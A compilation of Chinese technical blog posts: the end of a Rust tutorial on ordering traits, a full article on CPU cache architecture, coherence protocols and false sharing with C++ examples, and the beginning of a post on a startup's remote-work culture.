    fn partial_cmp(&self, rhs: &Self) -> Option<Ordering> {
        Some(self.cmp(rhs))
    }
}
impl Eq for Employee {
}
impl PartialEq for Employee {
    fn eq(&self, rhs: &Self) -> bool {
        self.salary == rhs.salary
    }
}
```

于是，我们就可以进行如下的操作了：

```
let mut v = vec![
    Employee {name : String::from("Bob"),     salary: 2048},
    Employee {name : String::from("Alice"),   salary: 3208},
    Employee {name : String::from("Tom"),     salary: 2359},
    Employee {name : String::from("Jack"),    salary: 4865},
    Employee {name : String::from("Marray"),  salary: 3743},
    Employee {name : String::from("Hao"),     salary: 2964},
    Employee {name : String::from("Chen"),    salary: 4197},
];

//用for-loop找出薪水最多的人
let mut e = &v[0];
for i in 0..v.len() {
    if *e < v[i] { 
        e = &v[i]; 
    }
}
println!("max = {:?}", e);

//使用标准的方法
println!("min = {:?}", v.iter().min().unwrap());
println!("max = {:?}", v.iter().max().unwrap());

//使用标准的排序方法
v.sort();
println!("{:?}", v);
```

#### 小结

现在我们来小结一下：

- 在Rust的中，最重要的概念就是“不可变”和“所有权”以及“Trait”这三个概念。
- 在所有权概念上，Rust喜欢move所有权，如果需要借用则需要使用引用。
- Move所有权会导致一些编程上的复杂度，尤其是需要同时move两个变量时。
- 引用（借用）的问题是生命周期的问题，一些时候需要程序员来标注生命周期。
- 在函数式的闭包和多线程下，这些所有权又出现了各种麻烦事。
- 使用智能指针可以解决所有权和借用带来的复杂度，但带来其它的问题。
- 最后介绍了Rust的Trait对象完成多态和函数重载的玩法。

Rust是一个比较严格的编程语言，它会严格检查你程序中的：

- 变量是否是可变的
- 变量的所有权是否被移走了
- 引用的生命周期是否完整
- 对象是否需要实现一些Trait

这些东西都会导致失去编译的灵活性，并在一些时候需要“去糖”，导致，你在使用Rust会有诸多的不适应，程序编译不过的挫败感也是令人沮丧的。在初学Rust的时候，我想自己写一个单向链表，结果，费尽心力，才得以完成。也就是说，**如果你对Rust的概念认识的不完整，你完全写不出程序，那怕就是很简单的一段代码**。我觉得，这种挺好的，逼着程序员必需了解所有的概念才能编码。但是，另一方面也表明了这门语言并不适合初学者。

没有银弹，任何语言都有些适合的地方和场景。

（全文完）

# 与程序员相关的CPU缓存知识

#####  [2020年03月01日 ](https://coolshell.cn/articles/20793.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [107 条评论](https://coolshell.cn/articles/20793.html#comments) 145,152 人阅读

![img](photo/cpu_512x512-300x300.png)好久没有写一些微观方面的文章了，今天写一篇关于CPU Cache相关的文章，这篇文章比较长，主要分成这么几个部分：基础知识、缓存的命中、缓存的一致性、相关的代码示例和延伸阅读。其中会讲述一些多核 CPU 的系统架构以及其原理，包括对程序性能上的影响，以及在进行并发编程的时候需要注意到的一些问题。这篇文章我会尽量地写简单和通俗易懂一些，主要是讲清楚相关的原理和问题，而对于一些细节和延伸阅读我会在文章最后会给出相关的资源。

因为无论你写什么样的代码都会交给CPU来执行，所以，如果你想写出性能比较高的代码，这篇文章中提到的技术还是值得认真学习的。另外，千万别觉得这些东西没用，这些东西非常有用，十多年前就是这些知识在性能调优上帮了我的很多大忙，从而跟很多人拉开了差距……

目录



[基础知识](https://coolshell.cn/articles/20793.html#基础知识)[缓存的命中](https://coolshell.cn/articles/20793.html#缓存的命中)[缓存的一致性](https://coolshell.cn/articles/20793.html#缓存的一致性)[程序性能](https://coolshell.cn/articles/20793.html#程序性能)[示例一](https://coolshell.cn/articles/20793.html#示例一)[示例二](https://coolshell.cn/articles/20793.html#示例二)[示例三](https://coolshell.cn/articles/20793.html#示例三)[示例四](https://coolshell.cn/articles/20793.html#示例四)[示例五](https://coolshell.cn/articles/20793.html#示例五)[延伸阅读](https://coolshell.cn/articles/20793.html#延伸阅读)

#### 基础知识

首先，我们都知道现在的CPU多核技术，都会有几级缓存，老的CPU会有两级内存（L1和L2），新的CPU会有三级内存（L1，L2，L3 ），如下图所示：

![img](photo/cache.architecture.png)

其中：

- L1缓存分成两种，一种是指令缓存，一种是数据缓存。L2缓存和L3缓存不分指令和数据。
- L1和L2缓存在每一个CPU核中，L3则是所有CPU核心共享的内存。
- L1、L2、L3的越离CPU近就越小，速度也越快，越离CPU远，速度也越慢。

再往后面就是内存，内存的后面就是硬盘。我们来看一些他们的速度：

- L1 的存取速度：**4 个CPU时钟周期**
- L2 的存取速度： **11 个CPU时钟周期**
- L3 的存取速度：**39 个CPU时钟周期**
- RAM内存的存取速度**：107 个CPU时钟周期**

我们可以看到，L1的速度是RAM的27倍，但是L1/L2的大小基本上也就是KB级别的，L3会是MB级别的。例如：[Intel Core i7-8700K](https://en.wikichip.org/wiki/intel/core_i7/i7-8700k) ，是一个6核的CPU，每核上的L1是64KB（数据和指令各32KB），L2 是 256K，L3有2MB（我的苹果电脑是[ Intel Core i9-8950HK](https://en.wikichip.org/wiki/intel/core_i9/i9-8950hk)，和Core i7-8700K的Cache大小一样）。

我们的数据就从内存向上，先到L3，再到L2，再到L1，最后到寄存器进行CPU计算。为什么会设计成三层？这里有下面几个方面的考虑：

- 一个方面是物理速度，如果要更大的容量就需要更多的晶体管，除了芯片的体积会变大，更重要的是大量的晶体管会导致速度下降，因为访问速度和要访问的晶体管所在的位置成反比，也就是当信号路径变长时，通信速度会变慢。这部分是物理问题。
- 另外一个问题是，多核技术中，数据的状态需要在多个CPU中进行同步，并且，我们可以看到，cache和RAM的速度差距太大，所以，多级不同尺寸的缓存有利于提高整体的性能。

这个世界永远是平衡的，一面变得有多光鲜，另一面也会变得有多黑暗。建立这么多级的缓存，一定就会引入其它的问题，这里有两个比较重要的问题，

- 一个是比较简单的缓存的命中率的问题。
- 另一个是比较复杂的缓存更新的一致性问题。

尤其是第二个问题，在多核技术下，这就很像分布式的系统了，要对多个地方进行更新。

#### 缓存的命中

在说明这两个问题之前。我们需要要解一个术语 Cache Line。缓存基本上来说就是把后面的数据加载到离自己近的地方，对于CPU来说，它是不会一个字节一个字节的加载的，因为这非常没有效率，一般来说都是要一块一块的加载的，对于这样的一块一块的数据单位，术语叫“Cache Line”，一般来说，一个主流的CPU的Cache Line 是 64 Bytes（也有的CPU用32Bytes和128Bytes），64Bytes也就是16个32位的整型，这就是CPU从内存中捞数据上来的最小数据单位。

比如：Cache Line是最小单位（64Bytes），所以先把Cache分布多个Cache Line，比如：L1有32KB，那么，32KB/64B = 512 个 Cache Line。

一方面，缓存需要把内存里的数据放到放进来，英文叫 CPU Associativity。Cache的数据放置的策略决定了内存中的数据块会拷贝到CPU Cache中的哪个位置上，因为Cache的大小远远小于内存，所以，需要有一种地址关联的算法，能够让内存中的数据可以被映射到Cache中来。这个有点像内存地址从逻辑地址向物理地址映射的方法，但不完全一样。

基本上来说，我们会有如下的一些方法。

- 一种方法是，任何一个内存地址的数据可以被缓存在任何一个Cache Line里，这种方法是最灵活的，但是，如果我们要知道一个内存是否存在于Cache中，我们就需要进行O(n)复杂度的Cache遍历，这是很没有效率的。
- 另一种方法，为了降低缓存搜索算法，我们需要使用像Hash Table这样的数据结构，最简单的hash table就是做“求模运算”，比如：我们的L1 Cache有512个Cache Line，那么，公式：`（内存地址 mod 512）* 64` 就可以直接找到所在的Cache地址的偏移了。但是，这样的方式需要我们的程序对内存地址的访问要非常地平均，不然冲突就会非常严重。这成了一种非常理想的情况了。
- 为了避免上述的两种方案的问题，于是就要容忍一定的hash冲突，也就出现了 N-Way 关联。也就是把连续的N个Cache Line绑成一组，然后，先把找到相关的组，然后再在这个组内找到相关的Cache Line。这叫 Set Associativity。如下图所示。

![img](photo/cache-associative-fill-both.png)

对于 N-Way 组关联，可能有点不好理解，这里个例子，并多说一些细节（不然后面的代码你会不能理解），Intel 大多数处理器的L1 Cache都是32KB，8-Way 组相联，Cache Line 是64 Bytes。这意味着，

- 32KB的可以分成，32KB / 64 = 512 条 Cache Line。
- 因为有8 Way，于是会每一Way 有 512 / 8 = 64 条 Cache Line。
- 于是每一路就有 64 x 64 = 4096 Byts 的内存。

为了方便索引内存地址，

- **Tag**：每条 Cache Line 前都会有一个独立分配的 24 bits来存的 tag，其就是内存地址的前24bits
- **Index**：内存地址后续的6个bits则是在这一Way的是Cache Line 索引，2^6 = 64 刚好可以索引64条Cache Line
- **Offset**：再往后的6bits用于表示在Cache Line 里的偏移量

如下图所示：（图片来自《[Cache: a place for concealment and safekeeping](https://manybutfinite.com/post/intel-cpu-caches/)》）

当拿到一个内存地址的时候，先拿出中间的 6bits 来，找到是哪组。

![img](photo/L1CacheExample.png)

然后，在这一个8组的cache line中，再进行O(n) n=8 的遍历，主是要匹配前24bits的tag。如果匹配中了，就算命中，如果没有匹配到，那就是cache miss，如果是读操作，就需要进向后面的缓存进行访问了。L2/L3同样是这样的算法。而淘汰算法有两种，一种是随机一种是LRU。现在一般都是以LRU的算法（通过增加一个访问计数器来实现）

![img](photo/selectingCacheLine.png)

这也意味着：

- L1 Cache 可映射 36bits 的内存地址，一共 2^36 = 64GB的内存
- 当CPU要访问一个内存的时候，通过这个内存中间的6bits 定位是哪个set，通过前 24bits 定位相应的Cache Line。
- 就像一个hash Table的数据结构一样，先是O(1)的索引，然后进入冲突搜索。
- 因为中间的 6bits 决定了一个同一个set，所以，对于一段连续的内存来说，每隔4096的内存会被放在同一个组内，导致缓存冲突。

此外，当有数据没有命中缓存的时候，CPU就会以最小为Cache Line的单元向内存更新数据。当然，CPU并不一定只是更新64Bytes，因为访问主存实在是太慢了，所以，一般都会多更新一些。好的CPU会有一些预测的技术，如果找到一种pattern的话，就会预先加载更多的内存，包括指令也可以预加载。这叫 Prefetching 技术 （参看，Wikipedia 的 [Cache Prefetching](https://en.wikipedia.org/wiki/Cache_prefetching) 和 [纽约州立大学的 Memory Prefetching](http://compas.cs.stonybrook.edu/~nhonarmand/courses/sp16/cse502/slides/13-prefetch.pdf)）。比如，你在for-loop访问一个连续的数组，你的步长是一个固定的数，内存就可以做到prefetching。（注：指令也是以预加载的方式执行，参看本站的《[代码执行的效率](https://coolshell.cn/articles/7886.html)》中的第三个示例）

了解这些细节，会有利于我们知道在什么情况下有可以导致缓存的失效。

#### 缓存的一致性

对于主流的CPU来说，缓存的写操作基本上是两种策略（参看本站《[缓存更新的套路](https://coolshell.cn/articles/17416.html)》），

- 一种是Write Back，写操作只要在cache上，然后再flush到内存上。
- 一种是Write Through，写操作同时写到cache和内存上。

为了提高写的性能，一般来说，主流的CPU（如：Intel Core i7/i9）采用的是Write Back的策略，因为直接写内存实在是太慢了。

好了，现在问题来了，如果有一个数据 x 在 CPU 第0核的缓存上被更新了，那么其它CPU核上对于这个数据 x 的值也要被更新，这就是缓存一致性的问题。（当然，对于我们上层的程序我们不用关心CPU多个核的缓存是怎么同步的，这对上层的代码来说都是透明的）

一般来说，在CPU硬件上，会有两种方法来解决这个问题。

- **Directory 协议**。这种方法的典型实现是要设计一个集中式控制器，它是主存储器控制器的一部分。其中有一个目录存储在主存储器中，其中包含有关各种本地缓存内容的全局状态信息。当单个CPU Cache 发出读写请求时，这个集中式控制器会检查并发出必要的命令，以在主存和CPU Cache之间或在CPU Cache自身之间进行数据同步和传输。
- **Snoopy 协议**。这种协议更像是一种数据通知的总线型的技术。CPU Cache通过这个协议可以识别其它Cache上的数据状态。如果有数据共享的话，可以通过广播机制将共享数据的状态通知给其它CPU Cache。这个协议要求每个CPU Cache 都可以***“\*窥探\*”\***数据事件的通知并做出相应的反应。如下图所示，有一个Snoopy Bus的总线。

**![img](photo/The-cache-coherence-problem-Initially-processors-0-and-1-both-read-location-x.png)**

因为Directory协议是一个中心式的，会有性能瓶颈，而且会增加整体设计的复杂度。而Snoopy协议更像是微服务+消息通讯，所以，现在基本都是使用Snoopy的总线的设计。

这里，我想多写一些细节，因为这种微观的东西，让人不自然地就会跟分布式系统关联起来，在分布式系统中我们一般用Paxos/Raft这样的分布式一致性的算法。而在CPU的微观世界里，则不必使用这样的算法，原因是因为CPU的多个核的硬件不必考虑网络会断会延迟的问题。所以，CPU的多核心缓存间的同步的核心就是要管理好数据的状态就好了。

这里介绍几个状态协议，先从最简单的开始，MESI协议，这个协议跟那个著名的足球运动员梅西没什么关系，其主要表示缓存数据有四个状态：Modified（已修改）, Exclusive（独占的）,Shared（共享的），Invalid（无效的）。

这些状态的状态机如下所示（有点复杂，你可以先不看，这个图就是想告诉你状态控制有多复杂）：

![img](photo/MESI.png)

下面是个示例（如果你想看一下动画演示的话，这里有一个网页（[MESI Interactive Animations](https://www.scss.tcd.ie/Jeremy.Jones/VivioJS/caches/MESIHelp.htm)），你可以进行交互操作，这个动画演示中使用的Write Through算法）：

| 当前操作           | CPU0    | CPU1   | Memory | 说明                                                         |
| :----------------- | :------ | :----- | :----- | :----------------------------------------------------------- |
| 1) CPU0 read(x)    | x=1 (E) |        | x=1    | 只有一个CPU有 x 变量， 所以，状态是 Exclusive                |
| 2) CPU1 read(x)    | x=1 (S) | x=1(S) | x=1    | 有两个CPU都读取 x 变量， 所以状态变成 Shared                 |
| 3) CPU0 write(x,9) | x=9 (M) | x=1(I) | x=1    | 变量改变，在CPU0中状态 变成 Modified，在CPU1中 状态变成 Invalid |
| 4) 变量 x 写回内存 | x=9 (M) | X=1(I) | x=9    | 目前的状态不变                                               |
| 5) CPU1 read(x)    | x=9 (S) | x=9(S) | x=9    | 变量同步到所有的Cache中， 状态回到Shared                     |

 

MESI 这种协议在数据更新后，会标记其它共享的CPU缓存的数据拷贝为Invalid状态，然后当其它CPU再次read的时候，就会出现 cache miss 的问题，此时再从内存中更新数据。从内存中更新数据意味着20倍速度的降低。我们能不能直接从我隔壁的CPU缓存中更新？是的，这就可以增加很多速度了，但是状态控制也就变麻烦了。还需要多来一个状态：Owner(宿主)，用于标记，我是更新数据的源。于是，出现了 [MOESI 协议](https://en.wikipedia.org/wiki/MOESI_protocol)

MOESI协议的状态机和演示示例我就不贴了（有兴趣可以上[Berkeley上看看相关的课件](https://inst.eecs.berkeley.edu/~cs61c/su18/disc/11/Disc11Sol.pdf)），**我们只需要理解MOESI协议允许 CPU Cache 间同步数据，于是也降低了对内存的操作**，性能是非常大的提升，但是控制逻辑也非常复杂。

顺便说一下，与 MOESI 协议类似的一个协议是 [MESIF](https://en.wikipedia.org/wiki/MESIF_protocol)，其中的 F 是 Forward，同样是把更新过的数据转发给别的 CPU Cache 但是，MOESI 中的 Owner 状态 和MESIF 中的 Forward 状态有一个非常大的不一样—— **Owner状态下的数据是dirty的，还没有写回内存，Forward状态下的数据是clean的，可以丢弃而不用另行通知**。

需要说明的是，AMD用MOESI，Intel用MESIF。所以，F 状态主要是针对 CPU L3 Cache 设计的（前面我们说过，L3是所有CPU核心共享的）。（相关的比较可以参看[StackOverlow上这个问题的答案](https://stackoverflow.com/a/49989985)）

#### 程序性能

了解了我们上面的这些东西后，我们来看一下对于程序的影响。

##### 示例一

首先，假设我们有一个64M长的数组，设想一下下面的两个循环：

```
const int LEN = 64*1024*1024;
int *arr = new int[LEN];

for (int i = 0; i < LEN; i += 2) arr[i] *= i;

for (int i = 0; i < LEN; i += 8) arr[i] *= i;
```

按我们的想法来看，第二个循环要比第一个循环少4倍的计算量，其应该也是要快4倍的。但实际跑下来并不是，**在我的机器上，第一个循环需要127毫秒，第二个循环则需要121毫秒，相差无几**。这里最主要的原因就是 Cache Line，因为CPU会以一个Cache Line 64Bytes最小时单位加载，也就是16个32bits的整型，所以，无论你步长是2还是8，都差不多。而后面的乘法其实是不耗CPU时间的。

##### 示例二

我们再来看一个与缓存命中率有关的代码，我们以一定的步长`increment` 来访问一个连续的数组。

```
for (int i = 0; i < 10000000; i++) {
    for (int j = 0; j < size; j += increment) {
        memory[j] += j;
    }
}
```

我们测试一下，在下表中， 表头是步长，也就是每次跳多少个整数，而纵向是这个数组可以跳几次（你可以理解为要几条Cache Line），于是表中的任何一项代表了这个数组有多少，而且步长是多少。比如：横轴是 512，纵轴是4，意思是，这个数组有 `4*512 = 2048` 个长度，访问时按512步长访问，也就是访问其中的这几项：`[0, 512, 1024, 1536]` 这四项。

表中同的项是，是循环1000万次的时间，单位是“微秒”（除以1000后是毫秒）

```
| count |   1    |   16  |  512  | 1024  |
------------------------------------------
|     1 |  17539 | 16726 | 15143 | 14477 |
|     2 |  15420 | 14648 | 13552 | 13343 |
|     3 |  14716 | 14463 | 15086 | 17509 |
|     4 |  18976 | 18829 | 18961 | 21645 |
|     5 |  23693 | 23436 | 74349 | 29796 |
|     6 |  23264 | 23707 | 27005 | 44103 |
|     7 |  28574 | 28979 | 33169 | 58759 |
|     8 |  33155 | 34405 | 39339 | 65182 |
|     9 |  37088 | 37788 | 49863 |156745 |
|    10 |  41543 | 42103 | 58533 |215278 |
|    11 |  47638 | 50329 | 66620 |335603 |
|    12 |  49759 | 51228 | 75087 |305075 |
|    13 |  53938 | 53924 | 77790 |366879 |
|    14 |  58422 | 59565 | 90501 |466368 |
|    15 |  62161 | 64129 | 90814 |525780 |
|    16 |  67061 | 66663 | 98734 |440558 |
|    17 |  71132 | 69753 |171203 |506631 |
|    18 |  74102 | 73130 |293947 |550920 |
```

我们可以看到，从 `[9，1024]` 以后，时间显著上升。包括 `[17，512]` 和 `[18,512]` 也显著上升。这是因为，我机器的 L1 Cache 是 32KB, 8 Way 的，前面说过，8 Way的有64组，每组8个Cache Line，当for-loop步长超过1024个整型，也就是正好 4096 Bytes时，也就是导致内存地址的变化是变化在高位的24bits上，而低位的12bits变化不大，尤其是中间6bits没有变化，导致全部命中同一组set，导致大量的cache 冲突，导致性能下降，时间上升。而 [16, 512]也是一样的，其中的几步开始导致L1 Cache开始冲突失效。

##### 示例三

接下来，我们再来看个示例。下面是一个二维数组的两种遍历方式，一个逐行遍历，一个是逐列遍历，这两种方式在理论上来说，寻址和计算量都是一样的，执行时间应该也是一样的。

```
const int row = 1024;
const int col = 512
int matrix[row][col];

//逐行遍历
int sum_row=0;
for(int _r=0; _r<row; _r++) {
    for(int _c=0; _c<col; _c++){
        sum_row += matrix[_r][_c];
    }
}

//逐列遍历
int sum_col=0;
for(int _c=0; _c<col; _c++) {
    for(int _r=0; _r<row; _r++){
        sum_col += matrix[_r][_c];
    }
}
```

然而，并不是，在我的机器上，得到下面的结果。

- 逐行遍历：0.081ms
- 逐列遍历：1.069ms

执行时间有十几倍的差距。其中的原因，就是逐列遍历对于CPU Cache 的运作方式并不友好，所以，付出巨大的代价。

##### 示例四

接下来，我们来看一下多核下的性能问题，参看如下的代码。两个线程在操作一个数组的两个不同的元素（无需加锁），线程循环1000万次，做加法操作。在下面的代码中，我高亮了一行，就是`p2`指针，要么是`p[1]`，或是 `p[30]`，理论上来说，无论访问哪两个数组元素，都应该是一样的执行时间。

```
void fn (int* data) {
    for(int i = 0; i < 10*1024*1024; ++i)
        *data += rand();
}

int p[32];

int *p1 = &p[0];
int *p2 = &p[1]; // int *p2 = &p[30];

thread t1(fn, p1);
thread t2(fn, p2);
```

然而，并不是，在我的机器上执行下来的结果是：

- 对于 `p[0]` 和 `p[1]` ：560ms
- 对于 `p[0]` 和 `p[30]`：104ms

这是因为 `p[0]` 和 `p[1]` 在同一条 Cache Line 上，而 `p[0]` 和 `p[30]` 则不可能在同一条Cache Line 上 ，CPU的缓存最小的更新单位是Cache Line，所以，**这导致虽然两个线程在写不同的数据，但是因为这两个数据在同一条Cache Line上，就会导致缓存需要不断进在两个CPU的L1/L2中进行同步，从而导致了5倍的时间差异**。

##### 示例五

接下来，我们再来看一下另外一段代码：我们想统计一下一个数组中的奇数个数，但是这个数组太大了，我们希望可以用多线程来完成这个统计。下面的代码中，**我们为每一个线程传入一个 id ，然后通过这个 id 来完成对应数组段的统计任务。这样可以加快整个处理速度**。

```
int total_size = 16 * 1024 * 1024; //数组长度
int* test_data = new test_data[total_size]; //数组
int nthread = 6; //线程数（因为我的机器是6核的）
int result[nthread]; //收集结果的数组

void thread_func (int id) {
    result[id] = 0;
    int chunk_size = total_size / nthread + 1;
    int start = id * chunk_size;
    int end = min(start + chunk_size, total_size);

    for ( int i = start; i < end; ++i ) {
        if (test_data[i] % 2 != 0 ) ++result[id];
    }
}
```

然而，在执行过程中，**你会发现，6个线程居然跑不过1个线程**。因为根据上面的例子你知道 `result[]` 这个数组中的数据在一个Cache Line中，所以，所有的线程都会对这个 Cache Line 进行写操作，导致所有的线程都在不断地重新同步 `result[]` 所在的 Cache Line，所以，导致 6 个线程还跑不过一个线程的结果。这叫 **False Sharing**。

优化也很简单，使用一个线程内的变量。

```
void thread_func (int id) {
    result[id] = 0;
    int chunk_size = total_size / nthread + 1;
    int start = id * chunk_size;
    int end = min(start + chunk_size, total_size);

    int c = 0; //使用临时变量，没有cache line的同步了
    for ( int i = start; i < end; ++i ) {
        if (test_data[i] % 2 != 0 ) ++c;
    }
    result[id] = c;
}
```

我们把两个程序分别在 1 到 32 个线程上跑一下，得出的结果画一张图如下所示（横轴是线程数，纵轴是完成统的时间，单位是微秒）：

![img](photo/false.sharing-1024x643.png)

上图中，我们可以看到，灰色的曲线就是第一种方法，橙色的就是第二种（用局部变量的）方法。当只有一个线程的时候，两个方法相当，基本没有什么差别，但是在线程数增加的时候的时候，你会发现，第二种方法的性能提高的非常快。直到到达6个线程的时候，开始变得稳定（前面说过，我的CPU是6核的）。而第一种方法无论加多少线程也没有办法超过第二种方法。因为第一种方法不是CPU Cache 友好的。也就是说，第二种方法，**只要我的CPU核数足够多，就可以做到线性的性能扩展，让每一个CPU核都跑起来，而第一种则不能**。

篇幅问题，示例就写到这里，相关的代码参看[我的Github相关仓库](https://github.com/haoel/cpu-cache)。

#### 延伸阅读

- Wikipedia : [CPU Cache ](https://en.wikipedia.org/wiki/CPU_cache)
- 经典文章：[Gallery of Processor Cache Effects](http://igoro.com/archive/gallery-of-processor-cache-effects/) （这篇文章中的测试已经有点过时了，但是这篇文章中所说的那些东西还是非常适用的）
- Effective C++作者 Scott Meyers 的演讲 CPU Caches and Why You Care （[Youtube](https://www.youtube.com/watch?v=WDIkqP4JbkE)，[PPT](https://www.aristeia.com/TalkNotes/codedive-CPUCachesHandouts.pdf)）
- 美国私立大学Swarthmore的教材 [Cache Architecture and Design](https://www.cs.swarthmore.edu/~kwebb/cs31/f18/memhierarchy/caching.html)
- 经典文章：[What Every Programmer Should Know About Memory](https://people.freebsd.org/~lstewart/articles/cpumemory.pdf) （这篇文章非常经典，但是开篇太晦涩了，居然告诉你晶体管内的构造，第三章和第六章是重点）
- Nonblocking Algorithms and Scalable Multicore Programming （[英文版](https://queue.acm.org/detail.cfm?id=2492433)，[中文版](https://www.oschina.net/translate/nonblocking-algorithms-and-scalable-multicore-programming)）
- Github上的一个代码库 [hardware-effects](https://github.com/Kobzol/hardware-effects) 里面有受CPU影响的程序的演示
- Optimizing for instruction caches （[Part 1](https://www.eetimes.com/optimizing-for-instruction-caches-part-1/)，[Part 2](https://www.eetimes.com/optimizing-for-instruction-caches-part-2/)， [Part 3](https://www.eetimes.com/optimizing-for-instruction-caches-part-3/)）
- 经典数据：[Latency Numbers Every Programmer Should Know](https://gist.github.com/jboner/2841832)
- 关于Java的可以看一下这篇[Optimizing Memory Access With CPU Cache](https://dzone.com/articles/optimizing-memory-access-with-cpu-cache) 或是 [Writing cache-friendly code](https://www.stardog.com/blog/writing-cache-friendly-code/)

总之，这个CPU Cache的调优技术不是什么新鲜的东西，只要Google就能找到有很多很多文章……

（全文完）

# MEGAEASE的远程工作文化

#####  [2020年01月31日 ](https://coolshell.cn/articles/20765.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [87 条评论](https://coolshell.cn/articles/20765.html#comments) 127,115 人阅读

![img](photo/remote-300x177.jpg)[MegaEase](https://megaease.com/) 是我创业的公司，主要是想把云计算（PaaS/SaaS层）的那些高可用高并发的分布式技术普及到那需要对技术自主可控的公司，这样就不需要去使用不能自主可控的闭源系统或是大公司的云平台。我于2016年开始成立MegaEase，从早期8个人，直到今天有20来个人，我们从一开始到今天都是在远程工作的公司文化。因为我很喜欢《[Rework](https://coolshell.cn/articles/9156.html)》这本书，写这本书的公司叫37signal（现名basecamp），这家公司在发《Rework》这本书的时候，整个公司只有16个人，分布在全世界8个城市，这种Geek的公司的文化很吸引我，所以，在我决定创业的时候，我就止不住地想成立这样能够远程工作的公司，于是，远程工作的团队文化就这样成为了MegaEase的基因。**下面我会分享一下，我们公司的远程工作文化和其中的一些问题，最后还有一个工作协议**。

我们在早期的时候，8个员工来自5个城市，现在的20来个员工来自8个城市2个国家。虽然我们现在使用“共享办公室”，但是本质上，我们的整个文化是远程工作的文化。在2017-2018年度，我们公司产品商业化以来，公司早期的8个工程师在远程工作的状态下成功支持了得到的老罗的跨年演讲活动，以及其它几个客户，一方面验证了用户愿意付费购买我们的产品和服务之后，另一方面也有一些不错的收入，客单价都在百万左右。还记得当时，有几个投资人并不相信我们连个办公室都没有，而且8个人分布在5个城市，觉得我们是个骗子公司（哈哈）。在过去的一年，我们通过我们的产品和服务帮助银行电信互联网等公司进行了他们的系统架构的改造和升级，让复杂和高门槛的分布式技术和架构可以被更多的企业所掌握所应用。这说明，远程工作是没有什么问题的。实际上远程团队远程工作真的不新鲜，Github上有个Repo维护着一个[支持远程工作的公司列表](https://github.com/remoteintech/remote-jobs)，还有一个[跟远程工作相关的Awesome索引](https://github.com/lukasz-madon/awesome-remote-job)。

当然，自从我创业以来，我身边就一直有好些不同的声音质疑远程工作。听过他们的理由后，我能够理解他们的疑虑和困惑，因为管理的确是一个很复杂的事，因为要面对的是极为复杂的人，所以，有这些疑虑也是正常的。下面是我的一些经验和分享。先说宏观管理，再说微观实践。



目录



[宏观管理](https://coolshell.cn/articles/20765.html#宏观管理)[一、努力找到好的人](https://coolshell.cn/articles/20765.html#一、努力找到好的人)[二、设定共同的目标和使命](https://coolshell.cn/articles/20765.html#二、设定共同的目标和使命)[三、倾向使用小团队](https://coolshell.cn/articles/20765.html#三、倾向使用小团队)[微观实践](https://coolshell.cn/articles/20765.html#微观实践)[远程工作协议](https://coolshell.cn/articles/20765.html#远程工作协议)[小结](https://coolshell.cn/articles/20765.html#小结)

#### 宏观管理

我发现很多人比较质疑远程工作的原因，更多的是表现在对宏观的管理上有问题。所以，我还是想先说一下宏观管理，这其实并不分远程办公还是集中式办公，**如果能够解决好些这管理上的根本问题，其实，远程不远程都无所谓了。只不过，这些问题在“远程办室”的场景更更突显罢了**。

##### **一、努力找到好的人**

**团队管理的头等大事是找人，没有之一。**很多人都会跟我说，你的这种远程团队需要很好的人。是的，没错，人很关键。远程团队需要的人的一般需要有这些特质：

- **能独挡一面的人**。这样交给他的事能独立完成，没有路能自己找路，这样可以省很多管理成本。
- **沟通能力很强的人**。一方面，他们把模糊的事能变清楚，另一方面，他能有效地说服他人。不然就会非常扯皮和消耗时间。
- **能自管理和自驱动**。不能自管理和自驱的人，会增加大量的管理和教育成本。能自驱动的人，都是对负责的事情有认同的人。

如果你仔细思考一下，**你会发现，这样的人是任何一家公司所渴望的人，和远不远程无关**。只不过，如果是远程团队的话，你会被逼着要招到这样的人。

招到这样的人，你团队的执行力会非常的强悍。招不到这样的人，你只能为他们不能自管理和自驱而招“经理”，不能写出好的代码而招“测试”，不能很好的沟通而招个“项目经理”，不能独档一面，而要把好的人安排给他们当“教练”，而好的人则会被累死……

这个时候，**你就需要计算一下了，是花时间精力在教育不好的人，还是花时间精力找好的人？无论远不远程，聪明的管理者都会选择后者**。这也就是为什么Amazon的Bezos会说，“我宁愿面50个人一个人都招不到，我也不愿意降低我的面试标准”。

##### **二、设定共同的目标和使命**

对于远程团队来说因为见不到面，所以，缺乏交流和沟通。所以，需要团队里所有人能在同一篇上，能够对要做的事有一个统一标准的认识。也就是共同的目标和使命的认知。知道要要什么，不要什么。知道取舍，知道trade-off。这些东西都是需要团队一起达成的共识。如果没有这样的“Same Picture”的目标和使命，就会出现很多不必要的误解和冲突。另外，因为团队和业务也在迅速发展中，所以，也需要不断地调整和沟通。这都需要领导者花费时间统一目标和使命。

老实说，无论远程不远程，一个团队也是需要有共同的目标和使命的。没有共同的目标，就算是集中在一起办公，也一样没有效率的。

##### **三、倾向使用小团队**

因为沟通成本的问题，远程团队更为倾向使用小团队，但并不是说小团队会限制整个公司的规模。《人月神话》说过，只有小团队才能驾驭复杂的系统。Amazon 的 Two Pizza Team的文化（团队的大小只能到两张披萨就能喂饱的大小），就是把整个系统拆成“微服务”架构，这样可以导致整体效率的巨大提升。表现在，可以并行开发，专注于一个功能更利于解决复杂问题，简单可以更容易的运维，可以更容易的规模化……

我工作的这20多年来经历过很多公司，尤其是创业的这几年来，看过的公司更多了（50+以上了），我发现，人数越多的团队，基本上来说，就更偏劳动密集型。劳动密集型的一个特征就是，**大家整天在想，得整点什么事给这么多人，好让他们忙起来。而人数少的团队，因为人不够，所以每天都在想，什么样的事更重要，什么样的事可以自动化，怎么做更有效率……**小团队和大团队的关注点就这么不一样了，所以做出来的事也就不一样了……

当然，并不是说劳动密集型有什么问题，就像《[软件团队的两种管理方式](https://coolshell.cn/articles/4951.html)》一文所说的一样，远程团队工作更倾向于“电影工作组”式的每个人都是leader的知识密集型的团队。

#### 微观实践

在远程工作中，我们需要有很多的微观操作来让大家能够更好的进行远程工作。因为远程工作也有一些问题（但是方法总比问题多，不是吗？）

- **文档驱动**。首先，远程的问题就是沟通不方便了，集中化的办公一群人可以在白板上进行讨论，然后远程工作这个事就变成很复杂了。所以，当要讨论什么事的时候，需要发起人先写一个文档，然后大家在这个文档上进行讨论（我们通常使用Github的issue，Pull Request或Google Doc）。另外，写文档的好处太多了，除了给后人有一个可以追溯的东西，更重要的是，写作是一种深度思考，当你把你脑子里想的东西写下来的时候，你就会发现你的思考更多了。所以，文档驱动我们团队能力非常重要的事。

